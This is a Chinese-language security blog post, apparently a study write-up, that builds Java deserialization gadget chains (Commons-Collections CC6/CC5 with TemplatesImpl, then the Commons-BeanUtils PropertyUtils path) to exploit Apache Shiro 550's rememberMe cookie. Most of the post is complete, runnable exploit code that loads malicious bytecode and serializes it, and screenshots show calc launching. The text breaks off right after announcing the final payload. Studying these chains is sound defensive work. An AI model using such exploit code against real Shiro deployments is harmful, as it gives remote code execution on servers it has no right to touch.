<h3 id="打commons-collections3"><a href="#打commons-collections3" class="headerlink" title="打commons-collections3"></a>打commons-collections3</h3><p>继续上周的部分，打cc3这个版本需要不能带有数组。于是我们需要拼凑CC链子，因此就需要对CC链子很了解，但是很不幸的是似乎无法自己构造出这一条CC链子，于是复习一下CC链子重新学习。要理解其中含义才行。<br>我们先来看结果：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> org.omg.SendingContext.RunTime;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, ClassNotFoundException, InstantiationException, NoSuchFieldException &#123;</span><br><span class="line">        <span class="comment">//cc3</span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line">        Class&lt;TemplatesImpl&gt; templatesClass = TemplatesImpl.class;</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templates, <span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodesField</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;D://netcat//Test.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">        bytecodesField.set(templates, codes);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//cc2</span></span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//cc6</span></span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map&lt;Object,Object&gt; decorate = LazyMap.decorate(hashMap, <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(decorate, templates);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap1 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap1.put(tiedMapEntry,<span class="string">&quot;key2&quot;</span>);</span><br><span class="line">        decorate.remove(templates);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">aClass</span> <span class="operator">=</span> LazyMap.class;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">factory</span> <span class="operator">=</span> aClass.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        factory.set(decorate,invokerTransformer);</span><br><span class="line"></span><br><span class="line">        serialize(hashMap1);</span><br><span class="line"><span class="comment">//        unserialize(&quot;ser.bin&quot;);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        objectOutputStream.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="keyword">return</span> objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>先序列化生成文件，之后复制到<code>shiro550.py</code>目录下，生成AES加密的rememberMe<br>直接打：<br><img src="/./../images/shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/17.png" alt="image.png"><br>弹出计算机就算成功了</p>
<h2 id="构造无数组CC链"><a href="#构造无数组CC链" class="headerlink" title="构造无数组CC链"></a>构造无数组CC链</h2><p><img src="/./../images/shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/18.png" alt="image.png"><br>这是全部CC链子的构造流程，其中有两个地方是需要数组的：</p>
<h3 id="1-InstantiateTransformer-类"><a href="#1-InstantiateTransformer-类" class="headerlink" title="1.InstantiateTransformer 类"></a>1.InstantiateTransformer 类</h3><p>因为<code>InstantiateTransformer</code>的下一个是利用<code>TrAXFilter</code> TrAXFilter这个类没有继承serialize接口  ，所以只能用<code>Transformer</code>数组包装构造他</p>
<h3 id="2-Runtime类"><a href="#2-Runtime类" class="headerlink" title="2.Runtime类"></a>2.Runtime类</h3><p>Runtime也没有继承Serialize接口，要用反射的方法包装他，因此也用到了<code>Transformer</code>数组</p>
<h3 id="重点"><a href="#重点" class="headerlink" title="重点"></a>重点</h3><p>因为这里需要构造没有数组的链子，我们采用加载恶意类的方式，左半部分（序列化入口）的我们就用CC6的链子<br>这里说一个比较细节的点就是从<code>LazyMap.get</code>到<code>InvokerTransformer.transformer</code>再到<code>TemplatesImpl.Transformer</code> 只要迈过这个坎其他就很好理解了。<br>首先我们从<code>LazyMap.get</code>入手：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">        <span class="comment">// create value for key if key is not currently in the map</span></span><br><span class="line">        <span class="keyword">if</span> (map.containsKey(key) == <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> factory.transform(key);</span><br><span class="line">            map.put(key, value);</span><br><span class="line">            <span class="keyword">return</span> value;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> map.get(key);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>这里的<code>factory.transform(key)</code>是我们后续利用的关键，并且最重要的是这里的factory和参数key都是我们可控的</p>
<h4 id="1-key"><a href="#1-key" class="headerlink" title="1.key"></a>1.key</h4><p><code>key</code>就是<code>factory.transform</code>的参数，在这里就是<code>InvokerTransformer.transform</code>的<code>input</code>参数。即<code>Lazy.get -&gt; key</code> &#x3D;&#x3D;<code>InvokerTransformer.transform -&gt; input</code><br><img src="/./../images/shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/19.png" alt="image.png"><br>因为这里是要对<code>TemplatesImpl</code>类调用<code>newTransformer</code>方法<br>所以key我们就传入TemplatesImpl</p>
<h4 id="2-factory"><a href="#2-factory" class="headerlink" title="2.factory"></a>2.factory</h4><p>factory是我们构造LazyMap的时候传入的：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="title function_">LazyMap</span><span class="params">(Map map, Transformer factory)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(map);</span><br><span class="line">        <span class="keyword">if</span> (factory == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Factory must not be null&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">this</span>.factory = factory;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>LazyMap的构造函数是私有的，我们利用decorate构造,但是由于序列化的时候不触发反序列化，我们后面利用反射修改factory的值</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">decorate</span><span class="params">(Map map, Transformer factory)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">LazyMap</span>(map, factory);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>根据链子我们是先走到<code>InvokerTransformer</code>类里面去的，因此后面反射的时候要把<code>factory</code>设置成<code>InvokerTransformer</code>。那我们构造<code>InvokerTransformer</code>的时候带什么参数构造呢？<br><code>LazyMap.get</code>是走到<code>InvokerTransformer.transform</code><br><img src="/./../images/shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/20.png" alt="image.png"><br>因为这里是要对<code>TemplatesImpl</code>类调用<code>newTransformer</code>方法<br>所以factory我们就传入newTransformer</p>
<p>同理我们可以利用这个方法构造其他路径的CC链：</p>
<h3 id="CC5-CC2-CC3"><a href="#CC5-CC2-CC3" class="headerlink" title="CC5+CC2+CC3"></a>CC5+CC2+CC3</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.omg.SendingContext.RunTime;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, ClassNotFoundException, InstantiationException, NoSuchFieldException &#123;</span><br><span class="line">        <span class="comment">//cc3</span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line">        Class&lt;TemplatesImpl&gt; templatesClass = TemplatesImpl.class;</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templates, <span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodesField</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;D://netcat//Test.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">        bytecodesField.set(templates, codes);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//cc2</span></span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//cc5</span></span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">decorate</span> <span class="operator">=</span> LazyMap.decorate(hashMap, invokerTransformer);</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(decorate, templates);</span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        Class&lt;BadAttributeValueExpException&gt; badAttributeValueExpExceptionClass = BadAttributeValueExpException.class;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">valField</span> <span class="operator">=</span> badAttributeValueExpExceptionClass.getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        valField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        valField.set(badAttributeValueExpException, tiedMapEntry);</span><br><span class="line">        serialize(badAttributeValueExpException);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        objectOutputStream.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="keyword">return</span> objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>同样的利用这个<code>ser.bin</code>生成payload：<br><img src="/./../images/shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/21.png" alt="image.png"><br>也可以弹出计算器：<br><img src="/./../images/shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/22.png" alt="image.png"></p>
<h2 id="shiro无依赖攻击"><a href="#shiro无依赖攻击" class="headerlink" title="shiro无依赖攻击"></a>shiro无依赖攻击</h2><p>之前我们都是利用shiro安装了CC的依赖进行攻击，那么原生的shiro是没有CC依赖的，我们要攻击原生的shiro就得先了解CB(<strong>commons-beanutils</strong>)<br>CB和CC2的关系比较近，可以先回顾一下CC2</p>
<h3 id="CB-commons-beanutils"><a href="#CB-commons-beanutils" class="headerlink" title="CB(commons-beanutils)"></a>CB(commons-beanutils)</h3><p>我们先来了解CB攻击，首先CB是为了更好地利用JavaBean研发的，我们来简单了解一下JaveBean:<br>简单理解就是如在Person类中，有属性name和age，这两个属性有对应的get和set方法分别设置他们的值和读取他们的值。这就是JavaBean<br>举个例子：<br>类Person：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.Test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.TransformerConfigurationException;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.Properties;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name, <span class="type">int</span> age)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>类Bean：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.Test;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Bean</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InvocationTargetException, IllegalAccessException, NoSuchMethodException &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;qingfeng&quot;</span>, <span class="number">18</span>);</span><br><span class="line">        person.getName();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>在类Bean中，我们<code>new</code>了一个<code>Person</code>，并且我们可以通过<code>getName</code>的方法来获取其中的属性name的值。同理如果想要获取<code>age</code>的值，可以利用方法<code>getAge</code>。<br>那么<code>commons-beanutils</code>的功能是什么呢？<br>前面提到过，<code>commons-beanutils</code>是为了更好地利用JavaBean，我们来看一个可以触发CB链的方法：<br><code>PropertyUtils.getProperty(person, &quot;age&quot;);</code><br>这一句便是我们漏洞的利用点，他的功能是什么呢，光看参数也能想到，他作用就是获取某个实例化后的类的属性。<br>我们修改类Bean:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.Test;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.PropertyUtils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Bean</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InvocationTargetException, IllegalAccessException, NoSuchMethodException, IOException &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;qingfeng&quot;</span>, <span class="number">18</span>);</span><br><span class="line">        System.out.println(PropertyUtils.getProperty(person, <span class="string">&quot;age&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>运行结果：<br><img src="/./../images/shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/23.png" alt="image.png"></p>
<p>我们在Person中设置了一个弹出计算器的点，就是获取name的值的时候会弹出计算器，让我们来试一下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.Test;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.PropertyUtils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Bean</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InvocationTargetException, IllegalAccessException, NoSuchMethodException, IOException &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;qingfeng&quot;</span>, <span class="number">18</span>);</span><br><span class="line">        System.out.println(PropertyUtils.getProperty(person, <span class="string">&quot;name&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="/./../images/shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/24.png" alt="image.png"><br>那么如何利用这个 形如 <code>get+属性名</code> 的方式来任意执行我们的代码呢？<br>我们在之前的CC2中学习到一个利用点叫<code>getOutputProperties</code>，不就是<code>get+属性名</code>的格式吗？<br>我们看一下方法<code>getOutputProperties</code>;</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> Properties <span class="title function_">getOutputProperties</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> newTransformer().getOutputProperties();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (TransformerConfigurationException e) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>这里就是newTransformer可以触发Templates的newTransformer，从而达到任意执行代码的目的。<br>先来小试牛刀一下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.Test;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.PropertyUtils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Bean</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InvocationTargetException, IllegalAccessException, NoSuchMethodException, IOException, NoSuchFieldException &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line">        Class&lt;TemplatesImpl&gt; templatesClass = TemplatesImpl.class;</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templates, <span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodesField</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;D://netcat//Test.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">        bytecodesField.set(templates, codes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactoryField</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactoryField.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">        System.out.println(PropertyUtils.getProperty(templates, <span class="string">&quot;outputProperties&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="/./../images/shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/25.png" alt="image.png"><br>成功执行</p>
<p>接下来的任务就是如何把他们串联起来，我们寻找何处调用了方法<code>getProperty</code><br><img src="/./../images/shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/26.png" alt="image.png"><br>发现老演员compare了，CC2链子计划通<br>直接贴payload了：</p>
